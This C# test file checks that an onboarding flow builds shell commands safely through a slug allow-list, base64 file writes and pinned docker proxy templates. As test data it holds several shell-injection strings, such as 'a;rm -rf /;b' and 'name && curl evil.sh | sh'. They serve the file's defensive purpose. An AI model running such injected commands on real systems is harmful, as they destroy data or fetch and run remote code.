using System.Text;
using Whiskers.Services.Onboarding;

namespace Whiskers.Tests;

/// <summary>W3 / C17: command-building tests for the onboarding flow (project rule: everything that
/// turns strings into shell commands gets string-assertion tests). The user-controlled input is the
/// server NAME — it must never reach a shell line except through the strict <c>Slug</c> allow-list;
/// file contents must only travel base64-encoded.</summary>
public class OnboardingCommandsTests
{
    // --- Slug: the single sanitizer between user input and the shell -----------------------------

    [Theory]
    [InlineData("Badwolf", "badwolf")]
    [InlineData("My Server 01", "my-server-01")]
    [InlineData("Über-Später!", "ber-sp-ter")]                    // non-ascii collapses, no specials survive
    [InlineData("a;rm -rf /;b", "a-rm-rf-b")]                     // injection attempt → hyphens
    [InlineData("$(reboot)", "reboot")]
    [InlineData("`whoami`", "whoami")]
    [InlineData("须弥", "server")]                                 // nothing usable → fixed fallback
    [InlineData("", "server")]
    public void Slug_is_a_strict_allow_list(string name, string expected)
        => Assert.Equal(expected, OnboardingCommands.Slug(name));

    [Theory]
    [InlineData("evil; touch /tmp/pwned")]
    [InlineData("name && curl evil.sh | sh")]
    [InlineData("name\"; reboot; \"")]
    public void Slug_output_never_contains_shell_metacharacters(string hostileName)
    {
        var slug = OnboardingCommands.Slug(hostileName);
        Assert.Matches("^[a-z0-9-]+$", slug);
    }

    // --- Command builders only ever see the slug ---------------------------------------------------

    [Fact]
    public void TailscaleUp_uses_the_slug_as_hostname()
    {
        var cmd = OnboardingCommands.TailscaleUp(OnboardingCommands.Slug("My Server!"));
        Assert.Equal("sudo systemd-run --collect --unit=ts-up tailscale up --accept-dns=false --hostname=my-server", cmd);
    }

    [Fact]
    public void WriteFileB64_pipes_base64_through_tee_and_creates_the_directory()
    {
        var b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes("services: {}\n"));
        var cmd = OnboardingCommands.WriteFileB64("/opt/telemetry/docker-compose.yml", b64);
        Assert.Equal($"sudo mkdir -p /opt/telemetry && echo {b64} | base64 -d | sudo tee /opt/telemetry/docker-compose.yml >/dev/null", cmd);
    }

    [Fact]
    public void WriteFileB64_content_never_appears_raw_in_the_command()
    {
        var hostile = "services:\n  x:\n    image: $(reboot)\n";
        var cmd = OnboardingCommands.WriteFileB64("/opt/x/y.yml",
            Convert.ToBase64String(Encoding.UTF8.GetBytes(hostile)));
        Assert.DoesNotContain("$(reboot)", cmd);
    }

    [Fact]
    public void AddScrapeTarget_ships_python_base64_encoded()
    {
        var cmd = OnboardingCommands.AddScrapeTargetCommand("/opt/telemetry-vm/scrape.yml", "srv-1", "100.64.0.7");
        Assert.StartsWith("echo ", cmd);
        Assert.EndsWith("| base64 -d | python3 -", cmd);
        // decode round-trip: the payload contains the ip + server id, the shell line does not
        var b64 = cmd.Split(' ')[1];
        var py = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
        Assert.Contains("ip='100.64.0.7'; sid='srv-1'", py);
        Assert.DoesNotContain("100.64.0.7:9100", cmd.Replace(b64, ""));
    }

    // --- Compose templates -------------------------------------------------------------------------

    [Fact]
    public void NodeExporterCompose_binds_to_the_tailnet_ip_only()
    {
        var yml = OnboardingCommands.NodeExporterCompose("100.64.0.7");
        Assert.Contains("--web.listen-address=100.64.0.7:9100", yml);
        Assert.DoesNotContain("0.0.0.0:9100", yml);
    }

    [Fact]
    public void DockerProxyCompose_publishes_2376_on_the_tailnet_ip_and_keeps_dangerous_verbs_off()
    {
        var yml = OnboardingCommands.DockerProxyCompose("100.64.0.7");
        Assert.Contains("'100.64.0.7:2376:2376'", yml);
        Assert.Contains("EXEC: 0", yml);
        Assert.Contains("SYSTEM: 0", yml);
        Assert.Contains("--allow-cn=serverwatch-client", yml);
    }

    [Fact]
    public void The_mtls_proxy_images_rolled_out_to_hosts_are_pinned_by_digest()
    {
        // The socket proxy (verb whitelist) and ghostunnel (mTLS) are the security boundary on every onboarded host:
        // a floating tag (":latest") would change them on the next pull without review. Dependabot does not see these
        // templates, so the pin is held here.
        var yml = OnboardingCommands.DockerProxyCompose("100.64.0.7");
        var images = System.Text.RegularExpressions.Regex.Matches(yml, @"image:\s*(\S+)").Select(m => m.Groups[1].Value).ToList();

        Assert.Equal(2, images.Count);
        Assert.All(images, image =>
        {
            Assert.Matches(@"^[a-z0-9./-]+:v\d+\.\d+\.\d+@sha256:[0-9a-f]{64}$", image);
            Assert.DoesNotContain(":latest", image);
        });
    }

    [Fact]
    public void The_hardened_socket_proxy_can_write_its_rendered_config()
    {
        // docker-socket-proxy renders haproxy.cfg at start (v0.4+: into /tmp); on the read-only root of the hardened
        // profile it exits unless /tmp is a tmpfs (measured: "can't create /tmp/haproxy.cfg: Read-only file system").
        var compose = DeploymentScripts.ReadRepoFile("docker-compose.hardened.yml").Replace("\r\n", "\n");
        var proxy = compose[compose.IndexOf("  socket-proxy:", StringComparison.Ordinal)..];
        var end = proxy.IndexOf("\n  serverwatch", StringComparison.Ordinal);
        if (end > 0) proxy = proxy[..end];

        Assert.Contains("read_only: true", proxy);
        // A writable tmpfs: "- /tmp" alone or with a comment, never "- /tmp:ro".
        Assert.Matches(@"tmpfs:\n(\s+- \S+.*\n)*\s+- /tmp(\s|$)", proxy);
    }

    // --- The protected boundary (socket-proxy verb whitelist, ghostunnel mTLS flags) ----------------------------------

    /// <summary>The verb whitelist, exactly — the same in the hardened profile and in the template rolled out to hosts.
    /// Changing it is a protected-area decision, so a test fails first.</summary>
    private static readonly string[] Whitelist =
    [
        "AUTH=0", "CONFIGS=0", "CONTAINERS=1", "EXEC=0", "IMAGES=1", "INFO=1", "NETWORKS=1", "PLUGINS=0", "POST=1",
        "SECRETS=0", "SWARM=0", "SYSTEM=0", "VERSION=1", "VOLUMES=1",
    ];

    [Fact]
    public void The_socket_proxy_whitelist_is_exactly_the_approved_one_in_both_places()
    {
        Assert.Equal(Whitelist, EnvironmentOf(Service(OnboardingCommands.DockerProxyCompose("100.64.0.7"), "socket-proxy")));
        Assert.Equal(Whitelist, EnvironmentOf(Service(HardenedCompose(), "socket-proxy")));
    }

    [Fact]
    public void The_ghostunnel_command_is_exactly_the_approved_one()
    {
        var command = System.Text.RegularExpressions.Regex
            .Matches(Service(OnboardingCommands.DockerProxyCompose("100.64.0.7"), "ghostunnel"), @"^\s+- (--\S+|server)$",
                System.Text.RegularExpressions.RegexOptions.Multiline)
            .Select(m => m.Groups[1].Value).ToArray();

        Assert.Equal(
        [
            "server", "--listen=0.0.0.0:2376", "--target=socket-proxy:2375", "--unsafe-target", "--cert=/certs/server.crt",
            "--key=/certs/server.key", "--cacert=/certs/ca.crt", "--allow-cn=serverwatch-client",
        ], command);
    }

    [Fact]
    public void The_templates_roll_out_the_same_images_as_the_files_dependabot_keeps_current()
    {
        // Dependabot moves the compose files, not these C# templates: a template that differs would hand new hosts an
        // older image. ghostunnel has no compose file of its own; its pin is checked by hand (deploy/README.md).
        Assert.Equal(ImageOf(Service(HardenedCompose(), "socket-proxy")),
            ImageOf(Service(OnboardingCommands.DockerProxyCompose("100.64.0.7"), "socket-proxy")));
        Assert.Equal(ImageOf(DeploymentScripts.ReadRepoFile("deploy", "telemetry", "host", "docker-compose.yml")),
            ImageOf(OnboardingCommands.NodeExporterCompose("100.64.0.7")));
    }

    private static string HardenedCompose() => DeploymentScripts.ReadRepoFile("docker-compose.hardened.yml");

    /// <summary>The block of one service (a two-space indented key) up to the next service.</summary>
    private static string Service(string compose, string name)
    {
        compose = compose.Replace("\r\n", "\n");
        var start = compose.IndexOf($"\n  {name}:\n", StringComparison.Ordinal);
        Assert.True(start >= 0, $"service {name} not found");
        var rest = compose[(start + 1)..];
        var next = System.Text.RegularExpressions.Regex.Match(rest[1..], @"\n  [a-z][a-z0-9-]*:\n");
        return next.Success ? rest[..(next.Index + 1)] : rest;
    }

    private static string[] EnvironmentOf(string service) =>
        System.Text.RegularExpressions.Regex.Matches(service, @"^      ([A-Z_]+): *([^\s#]+)", System.Text.RegularExpressions.RegexOptions.Multiline)
            .Select(m => $"{m.Groups[1].Value}={m.Groups[2].Value}").Order(StringComparer.Ordinal).ToArray();

    private static string ImageOf(string text) =>
        System.Text.RegularExpressions.Regex.Match(text.Replace("\r\n", "\n"), @"image:\s*(\S+)").Groups[1].Value;

    // --- Step metadata -----------------------------------------------------------------------------

    [Fact]
    public void Every_step_has_an_actionable_hint()
    {
        foreach (var step in Enum.GetValues<OnboardingStep>())
            Assert.False(string.IsNullOrWhiteSpace(OnboardingResult.Hint(step)));
    }
}
